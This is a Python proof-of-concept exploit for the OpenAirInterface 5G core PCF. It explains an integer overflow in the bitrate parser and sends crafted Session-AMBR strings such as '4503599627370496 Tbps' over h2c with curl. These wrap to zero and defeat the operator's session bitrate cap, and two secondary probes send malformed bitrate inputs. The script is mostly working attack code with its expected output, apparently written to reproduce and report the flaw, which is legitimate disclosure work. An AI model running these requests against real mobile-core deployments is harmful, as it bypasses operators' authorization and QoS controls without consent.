#!/usr/bin/env python3
"""
OAI CN5G PCF -- operator Session-AMBR cap bypass via integer overflow in
oai::utils::bitrate::to_bps()  (CWE-190 Integer Overflow -> CWE-863 Incorrect
Authorization / security-control bypass).

VULNERABLE CODE (oai-pcf @ develop 11c3ed4):
  src/common/utils/bitrate.hpp:71
      bps = std::stoull(m[1].str()) * multiplier;      // uint64 multiply, NO overflow check
  src/pcf_app/sm_policy/qos_session_authorization.cpp:32-49  clamp_bitrate():
      sub_bps   = to_bps(subscribed);                  // :35-36
      if (!sub_bps) return subscribed;                 // :37  (unparseable -> verbatim)
      effective = min(*sub_bps, *op_cap_bps);          // :39-40
      if (effective == *sub_bps) return subscribed;    // :47  <-- BYPASS: returns ORIGINAL string
      return from_bps(effective);                       // :48  (clamped)

  Npcf_SMPolicyControl_CreateSMpolicyContext feeds the SMF-supplied `subsSessAmbr`
  (a 3GPP BitRate string, validated by an EMPTY Ambr::validate() -- cand-07) straight
  into clamp_bitrate() against the operator cap pcf.qos_authorization.max_session_ambr_*.

WHY IT BYPASSES:
  "4503599627370496 Tbps" = 2^52 * 10^12 = 2^52 * (2^12 * 5^12) = 2^64 * 5^12 == 0 (mod 2^64).
  to_bps() therefore returns optional<uint64_t>(0) -- a *valid* value, not nullopt.
  effective = min(0, cap) = 0, and `effective == *sub_bps` (0 == 0) is TRUE, so line :47
  returns the ORIGINAL, astronomically large subscribed string UNCLAMPED as the authorized
  Session-AMBR. The operator ceiling is completely defeated by a single SBI request.

DIFFERENTIAL PROOF (this script):
  CONTROL  : subsSessAmbr = "<2x cap> Mbps"  -> 201, authSessAmbr == "<cap> Mbps"  (clamped)
  OVERFLOW : subsSessAmbr = "4503599627370496 Tbps" -> 201, authSessAmbr == the SAME
             enormous string (NOT clamped).  A far larger request passing where a 2x-cap
             request is correctly clamped IS the bypass.

SECONDARY PROBES (same unvalidated-BitRate-string root cause, reported as corroboration):
  cand-05 : subsSessAmbr = "1.99999999999999999999999 Mbps" (>19 fractional digits) ->
            the fractional std::stoull (bitrate.hpp:84) is OUTSIDE the try block and throws
            std::out_of_range; caught by the HTTP layer -> 400 on perfectly well-formed JSON.
  cand-07 : subsSessAmbr = "!!!not-a-bitrate!!!" -> Ambr::validate() is an empty stub
            (src/common-src/model/Ambr.cpp:37-53), so garbage is accepted -> 201 (no 400).

Transport: SBI is HTTP/2 cleartext (h2c, nghttp2). We shell out to
`curl --http2-prior-knowledge` (plain HTTP/1.1 is rejected with "-903 bad client magic").

Usage:
  ./oai_sessambr_overflow_bypass_poc.py --target 127.0.0.1:18080 --cap-mbps 100 \
        --evidence-dir . [--supi imsi-208950000000031] [--skip-secondary]
Exit code 0 = differential confirmed (vuln reproduced); 1 = not reproduced; 2 = transport error.
"""
import argparse
import json
import os
import subprocess
import sys
import tempfile

ROUTE = "/npcf-smpolicycontrol/v1/sm-policies"

# to_bps() wrap-to-zero values per unit (N * multiplier == 0 mod 2^64):
#   Tbps: 2^52 * 10^12 ; Gbps: 2^55 * 10^9 ; Mbps: 2^58 * 10^6 ; Kbps: 2^61 * 10^3
OVERFLOW_VALUES = [
    ("Tbps", "4503599627370496 Tbps"),        # 2^52 Tbps -> 0
    ("Gbps", "36028797018963968 Gbps"),       # 2^55 Gbps -> 0
    ("Mbps", "288230376151711744 Mbps"),      # 2^58 Mbps -> 0
]


def build_body(supi, psi, ambr_ul, ambr_dl):
    return {
        "supi": supi,
        "pduSessionId": psi,
        "pduSessionType": "IPV4",
        "dnn": "oai",
        "sliceInfo": {"sst": 1, "sd": "000001"},
        "notificationUri": "http://127.0.0.1:9999/notify",
        "subsSessAmbr": {"uplink": ambr_ul, "downlink": ambr_dl},
    }


def post_sm_policy(target, body, evidence_dir, tag):
    """POST one SM-policy create; return dict(http_code, location, auth_ul, auth_dl, raw)."""
    url = f"http://{target}{ROUTE}"
    hdr_f = os.path.join(evidence_dir, f"{tag}_resp_headers.txt")
    body_f = os.path.join(evidence_dir, f"{tag}_resp_body.json")
    req_f = os.path.join(evidence_dir, f"{tag}_req_body.json")
    with open(req_f, "w") as fh:
        json.dump(body, fh, indent=2)
    cmd = [
        "curl", "-s", "--http2-prior-knowledge", "-X", "POST", url,
        "-H", "Content-Type: application/json",
        "-D", hdr_f, "-o", body_f,
        "-w", "%{http_code}",
        "--data-binary", json.dumps(body),
        "--max-time", "30",
    ]
    try:
        http_code = subprocess.run(cmd, capture_output=True, text=True, timeout=40).stdout.strip()
    except Exception as exc:  # noqa: BLE001
        return {"http_code": "000", "error": str(exc), "tag": tag}
    location = ""
    try:
        with open(hdr_f) as fh:
            for line in fh:
                if line.lower().startswith("location:"):
                    location = line.split(":", 1)[1].strip()
    except OSError:
        pass
    auth_ul = auth_dl = None
    raw = ""
    try:
        with open(body_f) as fh:
            raw = fh.read()
        doc = json.loads(raw) if raw.strip() else {}
        sess = doc.get("sessRules") or {}
        for _rid, rule in sess.items():
            ambr = rule.get("authSessAmbr") or {}
            auth_ul = ambr.get("uplink")
            auth_dl = ambr.get("downlink")
            break
    except (OSError, ValueError):
        pass
    return {
        "http_code": http_code, "location": location,
        "auth_ul": auth_ul, "auth_dl": auth_dl, "raw": raw, "tag": tag,
    }


def main():
    ap = argparse.ArgumentParser(description="OAI PCF Session-AMBR cap-bypass PoC (cand-oai-pcf-01)")
    ap.add_argument("--target", default="127.0.0.1:18080", help="PCF SBI host:port (h2c)")
    ap.add_argument("--cap-mbps", type=int, default=100, help="operator max_session_ambr cap in Mbps (must match config)")
    ap.add_argument("--evidence-dir", default=".", help="directory to write request/response artefacts")
    ap.add_argument("--supi", default="imsi-208950000000031", help="base SUPI (incremented per request)")
    ap.add_argument("--skip-secondary", action="store_true", help="skip cand-05/cand-07 corroboration probes")
    args = ap.parse_args()

    ev = args.evidence_dir
    os.makedirs(ev, exist_ok=True)
    cap = args.cap_mbps
    supi_n = int(args.supi.split("-")[-1])

    def supi(off):
        return f"imsi-{supi_n + off}"

    results = []
    print(f"[*] Target PCF SBI (h2c): {args.target}   operator cap: {cap} Mbps")
    print(f"[*] Evidence dir: {ev}\n")

    # ---- CONTROL: 2x the cap -> must be clamped to the cap -------------------
    ctrl_ambr = f"{cap * 2} Mbps"
    r = post_sm_policy(args.target, build_body(supi(0), 1, ctrl_ambr, ctrl_ambr), ev, "control")
    ctrl_ok = (r["http_code"] == "201" and r["auth_ul"] == f"{cap} Mbps" and r["auth_dl"] == f"{cap} Mbps")
    print(f"[CONTROL ] subsSessAmbr={ctrl_ambr:>16}  HTTP {r['http_code']}  "
          f"authSessAmbr=({r['auth_ul']}, {r['auth_dl']})  -> clamped? {'YES (expected)' if ctrl_ok else 'NO (UNEXPECTED)'}")
    results.append(("control", ctrl_ambr, r, ctrl_ok))

    # ---- OVERFLOW: wrap-to-zero values -> must NOT be clamped ----------------
    overflow_ok_all = True
    for i, (unit, val) in enumerate(OVERFLOW_VALUES):
        r = post_sm_policy(args.target, build_body(supi(10 + i), 10 + i, val, val), ev, f"overflow_{unit}")
        # bypass proven iff 201 and the authorized AMBR equals the ORIGINAL enormous string
        ok = (r["http_code"] == "201" and r["auth_ul"] == val and r["auth_dl"] == val)
        overflow_ok_all = overflow_ok_all and ok
        print(f"[OVERFLOW] subsSessAmbr={val:>26} ({unit})  HTTP {r['http_code']}  "
              f"authSessAmbr.uplink={r['auth_ul']}  -> clamped? {'NO = CAP BYPASSED' if ok else 'yes/err (not reproduced)'}")
        results.append((f"overflow_{unit}", val, r, ok))

    secondary = {}
    if not args.skip_secondary:
        # ---- cand-05: unguarded stoull on a >19-digit fraction -> 400 on valid JSON
        frac = "1.99999999999999999999999 Mbps"
        r = post_sm_policy(args.target, build_body(supi(90), 90, frac, "100 Mbps"), ev, "cand05_longfrac")
        secondary["cand05_longfrac_400"] = (r["http_code"], r["http_code"] == "400")
        print(f"[cand-05 ] subsSessAmbr.uplink='{frac}' (well-formed JSON)  HTTP {r['http_code']}  "
              f"-> {'400 as predicted (stoull throw escaped to_bps)' if r['http_code'] == '400' else 'not 400'}")
        # ---- cand-07: Ambr::validate() is an empty stub -> garbage BitRate accepted
        garbage = "!!!not-a-bitrate!!!"
        r = post_sm_policy(args.target, build_body(supi(91), 91, garbage, garbage), ev, "cand07_garbage")
        secondary["cand07_garbage_201"] = (r["http_code"], r["http_code"] == "201")
        print(f"[cand-07 ] subsSessAmbr.uplink='{garbage}'  HTTP {r['http_code']}  "
              f"-> {'201 as predicted (validate() inert)' if r['http_code'] == '201' else 'rejected'}")

    # ---- VERDICT -------------------------------------------------------------
    verdict = ctrl_ok and overflow_ok_all
    summary = {
        "target": args.target, "operator_cap_mbps": cap,
        "control_clamped_to_cap": ctrl_ok,
        "overflow_bypass_all_units": overflow_ok_all,
        "secondary_probes": secondary,
        "verdict": "REPRODUCED" if verdict else "NOT_REPRODUCED",
        "detail": [
            {"case": t, "subs_ambr": v, "http": r.get("http_code"),
             "auth_ul": r.get("auth_ul"), "auth_dl": r.get("auth_dl"), "pass": ok}
            for (t, v, r, ok) in results
        ],
    }
    with open(os.path.join(ev, "poc_summary.json"), "w") as fh:
        json.dump(summary, fh, indent=2)
    print("\n" + "=" * 72)
    print(f"VERDICT: {summary['verdict']}  "
          f"(control clamped={ctrl_ok}; overflow bypassed={overflow_ok_all})")
    if verdict:
        print(f"  A {cap*2} Mbps request is clamped to {cap} Mbps, yet 2^52 Tbps "
              f"(and 2^55 Gbps / 2^58 Mbps) pass the SAME cap UNCLAMPED -> operator")
        print("  Session-AMBR ceiling is defeated by a single unauthenticated SBI request.")
    print("=" * 72)
    return 0 if verdict else 1


if __name__ == "__main__":
    sys.exit(main())
